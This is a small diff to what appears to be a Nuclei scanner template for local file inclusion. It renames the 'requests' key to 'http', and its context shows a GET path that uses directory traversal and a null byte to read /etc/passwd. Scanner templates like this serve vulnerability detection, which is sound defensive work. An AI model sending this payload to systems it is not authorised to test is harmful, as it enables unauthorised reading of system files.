@@ -6,7 +6,7 @@ info:
   author: reewardius
   tags: lfi,null-byte
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?file=../../../../../../etc/passwd%00.php"
